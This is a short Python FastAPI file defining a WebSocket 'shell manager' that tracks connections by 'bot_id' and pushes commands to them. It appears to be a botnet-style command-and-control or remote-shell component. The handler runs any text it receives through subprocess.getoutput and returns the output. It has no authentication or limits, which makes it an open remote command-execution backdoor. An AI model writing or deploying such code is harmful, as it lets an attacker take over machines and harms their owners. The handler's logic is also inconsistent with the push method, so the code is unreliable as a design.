from fastapi import WebSocket
import asyncio
import subprocess

class WSShellManager:
    def __init__(self):
        self.connections = {}

    async def handle(self, websocket: WebSocket, bot_id: str):
        await websocket.accept()
        self.connections[bot_id] = websocket
        try:
            while True:
                cmd = await websocket.receive_text()
                result = subprocess.getoutput(cmd)
                await websocket.send_text(result)
        except:
            del self.connections[bot_id]

    async def send_command(self, bot_id, command):
        ws = self.connections.get(bot_id)
        if ws:
            await ws.send_text(command)
